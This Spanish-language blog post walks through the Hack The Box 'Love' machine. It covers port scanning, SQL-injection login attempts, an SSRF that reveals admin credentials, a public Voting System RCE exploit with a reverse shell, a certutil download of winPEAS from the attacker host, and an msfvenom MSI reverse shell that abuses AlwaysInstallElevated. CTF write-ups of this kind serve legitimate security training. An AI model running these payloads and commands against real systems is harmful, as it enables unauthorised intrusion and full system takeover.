---
layout: post
title: HTB_Love
date: 2023/07/10
slug: HTB_Love
heroImage: /assets/machines.jpg
---

# Love {-}

## Introduccion {-}

La maquina del dia 07/08/2021 se llama Love
.

El replay del live se puede ver aqui

[![S4vitaar Love maquina](https://img.youtube.com/vi/bSTe009r_4M/0.jpg)](https://www.youtube.com/watch?v=bSTe009r_4M)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.239
```
ttl: 127 -> maquina Windows. 
Recordar que en cuanto a ttl respecta 64 = linux y 128 = windows. 
Pero comom estamos en hackthebox hay un nodo intermediario que hace que 
el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.239
```

Si consideras que va muy lento puedes meter los siguientes parametros para que valla mucho mas rapido el escaneo

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.239 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,4966,49667,49668,49669,49670 10.10.10.239 -oN targeted
```

| Puerto | Servicio       | Que se nos occure?              | Que falta? |
| ------ | -------------- | ------------------------------- | ---------- |
| 80     | http           | Web, fuzzing                    |            |
| 135    | rpc            |                                 |            |
| 139    | NetBios        |                                 |            |
| 443    | ssl (https)    |                                 |            |
| 445    | SMB            | Null session                    |            |
| 3306   | mssql?         |                                 |            |
| 5000   | http           |                                 |            |
| 5040   | http           |                                 |            |
| 5985   | WinRM          |                                 |            |
| 5986   | WinRM ssl      |                                 |            |
| 7680   | tcp panda-pub? |                                 |            |
| 47001  | http           |                                 |            |
| 49664  | msrpc          | puertos por defectos de windows |            |
| 49665  | msrpc          | puertos por defectos de windows |            |
| 49666  | msrpc          | puertos por defectos de windows |            |
| 49667  | msrpc          | puertos por defectos de windows |            |
| 49668  | msrpc          | puertos por defectos de windows |            |
| 49669  | msrpc          | puertos por defectos de windows |            |
| 49670  | msrpc          | puertos por defectos de windows |            |


### Analizando el SMB {-}

```bash
crackmapexec smb 10.10.10.239
smbclient -L 10.10.10.239 -N
```

Vemos que estamos en frente de una maquina Windows10 pro que se llama **Love** y poco mas

### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.239
whatweb https://10.10.10.239
```

Nada muy interesante aqui

#### Chequear el contenido de el certificado SSL con openssl {-}

```bash
openssl s_client -connect 10.10.10.239:443
```

vemos una direccion de correo 
```bash
 roy@love.htb 
```
 lo que quiere decir que tenemos un usuario y un dominio. 
Tambien vemos un dominio 
```bash
 staging.love.htb 
```
, quiere decir que es posible que se aplique virtual hosting.
Lo añadimos al 
```bash
 /etc/hosts 
```
 de la maquina de atacante.



![love-etc-hosts](/assets/images/love-etc-hosts.png) 
#### Chequear la web los puertos web {-}

```bash
cat targeted | grep "http"
cat targeted | grep "http" | grep -oP '\d{1-5}/tcp'
```

Aqui descartamos el puerto **47001** y los puertos **5985-5986** que ya sabemos que son los **WinRM**.

Con firefox navigamos en la web para ver lo que porque hay mucho por mirar. 

- el puerto 80 nos muestra una pagina de login.
- el puerto 443 nos muestra un **Forbidden**.
- el puerto 5000 nos muestra un **Forbidden**.
- el dominio **staging.love.htb** nos muestra otra web


#### Chequeando el puerto 80 {-}

Aqui como estamos en un panel de inicio de session, intentamos cosas

- admin / admin
- 1 / hola
- 0 / hola
- -1 / hola
- ;" / hola
- 1' or 1=1-- - / #
- ' or sleep(5)-- - / #
- 1 and sleep(5)-- - / #
- 1000 / hola

Aqui no parece que este vulnerable a inyeccion SQL. Vamos a fuzzear la web


#### Fuzzing con WFuzz {-}

Fuzzeamos el puerto 80

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZ
```

Encontramos una ruta 
```bash
 /admin 
```
. En la pagina admin vemos otro panel de inicio de session que no es la misma que la del 
```bash
 index.php 
```


#### Chequeando la pagina admin {-}

Aqui como estamos en un panel de inicio de session, intentamos cosas

- test / test
- admin / admin

Ya vemos por el mensaje de error quel usuario admin existe.

## Evaluacion de vulnerabilidades {-}

### Analizamos la web staging.love.htb {-}

Aqui llegamos en una pagina **Free File Scanner**. si pinchamos el menu Demo vemos un input que nos pregunta por un file url.

Vamos a ver lo que pasa si le damos una url de nuestro equipo de atacante

### Injeccion HTML y SSRF {-}

```bash
vi index.html

<h1>Hola</h1>
<marquee>Se tenso</marquee>
```

Creamos un servicio http con python

```bash
python3 -m http.server 80
```

En la web ponemos la url de nuestro equipo 
```bash
 http://10.10.14.8/ 
```
 y vemos que la web es vulnerable a una **Injeccion HTML**.
Intentamos con una pagina php

```bash
vi index.php

<?php
    system("whoami");
?>
```

Si ahora en la web le ponemos 
```bash
 http://10.10.14.8/index.php 
```
 no pasa nada quiere decir que esta en un contexto sanitizado.
Bueno aqui pensamos en un **SSRF** y intentamos cosas como 
```bash
 http://localhost/ 
```
. Esto nos muestra el panel de session que ya hemos analizado,
y probamos a ver si los puertos que tenian el mensaje **Forbidden** se pueden ahora burlar. 

Intentamos el puerto 5000, 
```bash
 http://localhost:5000/ 
```
 y effectivamente se puede ver la pagina. A demas vemos aqui las credenciales del usuario **admin**.

Nos conectamos ahora con el usuario admin en el panel de administracion y pa dentro.

### Voting System vunlerability {-}

Aqui como una vez mas vemos el voting system, mirramos si un exploit existe para este gestor de contenido

```bash
searchsploit voting system
```

Encontramos un que permitte hacer Ejecucion Remota de comandos una vez autenticados. Como no tenemos claro que version del voting system es,
intentamos utilizar el script

```bash
cd exploits
searchsploit -m php/webapps/49445.py
mv 49445.py voting-system.py
vi voting-system.py
```

Aqui vemos que el exploit nos da directamente une reverse shell.


## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion desde la vulnerabilidad de Voting System {-}

1. Controlamos que las urls que estan en el script existen en la web.

    Aqui vemos que las urls no son exactamente las mismas y que hay que modificarlas un poquito.

1. Modificamos el script para que ataque el servicio de la maquina victima

    ```{r, echo = FALSE, fig.cap="voting system reverse shell", out.width="90%"}
    knitr::include_graphics("images/love-votingsystem-rshell.png")

![love-votisystem-rshell](/assets/images/love-votingsystem-rshell.png) 
    ```bash
    rlwrap nc -nlvp 443
    ```

1. Lanzamos el script.

    ```bash
    python3 voting-system.py
    ```

Ya estamos en la maquina.## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
whoami
whoami /priv
whoami /all
```

Aqui no vemos nada de interesante.

```bash
cd c:\
cd PROGRA~1
dir
cd ..
cd PROGRA~2
dir
```

Investigamos un poco pero no vemos nada muy interesante. Decidimos lanzarle un WinPEAS

#### Analisis de vulnerabilidad Privesc con WINPEAS {-}

```bash
cd c:\Windows\Temp
mkdir EEEE
cd EEEE
```

Descargamos el 
```bash
 winpeasx64.exe 
```
 desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).

```bash
cd content
cp /home/s4vitar/Descargas/firefox/winPEASx64.exe .
python3 -m http.server 80
```

Lo descargamos desde la maquina victima y lo lanzamos.

```bash
certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
winPEAS.exe
```

Vemos algo interressante en Checking AlwaysInstallElevated

```{r, echo = FALSE, fig.cap="privesc hklm hkcu vuln", out.width="90%"}
knitr::include_graphics("images/love-hklm-hkcu.png")
```


![love-hklm-hkcu](/assets/images/love-hklm-hkcu.png) 
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f msi -o reverse.msi
    ```

1. lo enviamos a la maquina victima con el servidor http de python
1. nos ponemos en escucha por el puerto 443
1. lo ejecutamos desde la maquina victima

    ```bash
    msiexec /quiet /qn /i reverse.msi
    ```

Ya estamos a dentro con el usuario nt authority\system y podemos ver la flag.